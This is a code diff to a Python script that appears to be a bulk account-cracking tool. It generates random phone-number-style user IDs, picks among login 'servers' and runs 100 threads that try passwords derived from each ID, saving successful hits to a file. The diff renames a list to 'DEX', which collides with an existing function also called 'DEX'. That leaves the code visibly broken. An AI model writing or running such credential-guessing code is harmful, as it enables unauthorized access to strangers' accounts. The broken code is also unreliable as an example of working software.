@@ -34,7 +34,7 @@ logo="""
 def line():
     print("—"*36)
 def sykology():
-    emran=[]
+    DEX=[]
     DEX("clear")
     print(logo)
     print(" Example 018/017/019/016/015")
@@ -45,7 +45,7 @@ def sykology():
     line()
     for z in range(ehc_lim):
         co=''.join(random.choice(string.digits) for _ in range(8))
-        emran.append(co)
+        DEX.append(co)
     print(" [1] Server M      | [4] Server P")
     print(" [2] Server Mbasic | [5] Server X")
     print(" [3] Server Free   | [6] Server Touch")
@@ -72,11 +72,11 @@ def sykology():
     with ThreadPool(max_workers=100) as feel:
         DEX("clear")
         print(logo)
-        tl=str(len(emran))
+        tl=str(len(DEX))
         print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mDEX-ok.txt") 
         print(f"    \033[38;5;46mCRACK ID\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
         line()
-        for id in emran:
+        for id in DEX:
             uid=ehc_code+id
             pwx=[]
             pwx.append(uid[5:])#back 6
